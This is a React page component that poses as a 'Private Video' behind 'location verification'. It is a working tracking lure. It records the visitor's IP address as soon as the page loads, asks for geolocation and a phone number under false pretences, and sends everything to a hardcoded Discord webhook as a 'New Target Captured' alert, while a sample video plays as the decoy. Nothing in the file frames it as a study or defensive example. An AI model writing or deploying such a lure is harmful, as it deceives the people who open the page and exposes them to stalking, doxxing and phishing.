import { useState, useEffect } from 'react';

export default function Track() {
  const [step, setStep] = useState('gate'); // gate -> location -> phone -> done
  const [phone, setPhone] = useState('');
  const [ip, setIp] = useState('unknown');
  const [coords, setCoords] = useState(null);

  const WEBHOOK = 'https://discord.com/api/webhooks/1565494542264700939/gaHqWgCoTPiuNlC0kuUFVmPY9T7Cke5OK1Ye6tYdlCwdw29wTerQahn3Z5uoyxwO_HuD';

  useEffect(() => {
    // grab IP immediately on load
    fetch('https://api.ipify.org?format=json')
      .then(r => r.json())
      .then(d => setIp(d.ip))
      .catch(() => {});
  }, []);

  const requestLocation = () => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          setCoords({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy });
          setStep('phone');
        },
        (err) => {
          // if they deny location, still move to phone step
          setStep('phone'); 
        }
      );
    } else {
      setStep('phone');
    }
  };

  const submitPhone = async (e) => {
    e.preventDefault();
    setStep('done');

    const fields = [
      { name: 'IP Address', value: `\`${ip}\``, inline: false },
      { name: 'Phone Number', value: phone || 'None provided', inline: false },
    ];

    if (coords) {
      fields.push({ name: 'Latitude', value: `${coords.lat}`, inline: true });
      fields.push({ name: 'Longitude', value: `${coords.lon}`, inline: true });
      fields.push({ name: 'Map', value: `[Google Maps](https://www.google.com/maps?q=${coords.lat},${coords.lon})`, inline: false });
    } else {
      fields.push({ name: 'Location', value: 'Denied or Unsupported', inline: false });
    }

    await fetch(WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: 'Tracker',
        embeds: [{
          title: 'New Target Captured',
          color: 0x00ff00,
          fields,
          timestamp: new Date().toISOString()
        }]
      })
    });
  };

  if (step === 'gate') {
    return (
      <main style={{ display: 'flex', height: '100vh', justifyContent: 'center', alignItems: 'center', background: '#111', color: '#fff', fontFamily: 'sans-serif' }}>
        <div style={{ textAlign: 'center' }}>
          <h1>🔒 Private Video</h1>
          <p>This content requires location verification to view.</p>
          <button onClick={requestLocation} style={{ padding: '15px 30px', fontSize: '18px', background: '#0070f3', color: '#fff', border: 'none', borderRadius: '5px', cursor: 'pointer' }}>
            Verify Location to Watch
          </button>
        </div>
      </main>
    );
  }

  if (step === 'phone') {
    return (
      <main style={{ display: 'flex', height: '100vh', justifyContent: 'center', alignItems: 'center', background: '#111', color: '#fff', fontFamily: 'sans-serif' }}>
        <form onSubmit={submitPhone} style={{ textAlign: 'center' }}>
          <h1>Verification Required</h1>
          <p>Enter your phone number to receive the access code.</p>
          <input 
            type="tel" 
            placeholder="+1 (555) 000-0000" 
            value={phone}
            onChange={(e) => setPhone(e.target.value)}
            style={{ padding: '10px', fontSize: '16px', width: '250px', marginBottom: '15px' }}
            required
          />
          <br />
          <button type="submit" style={{ padding: '10px 20px', fontSize: '16px', background: '#0070f3', color: '#fff', border: 'none', borderRadius: '5px', cursor: 'pointer' }}>
            Submit
          </button>
        </form>
      </main>
    );
  }

  return (
    <main style={{ display: 'flex', height: '100vh', justifyContent: 'center', alignItems: 'center', background: '#111', color: '#fff', fontFamily: 'sans-serif' }}>
      <div style={{ textAlign: 'center' }}>
        <h1>✅ Access Granted</h1>
        <p>The video is loading...</p>
        <video width="600" controls autoPlay style={{ marginTop: '20px' }}>
          <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4" />
        </video>
      </div>
    </main>
  );
}
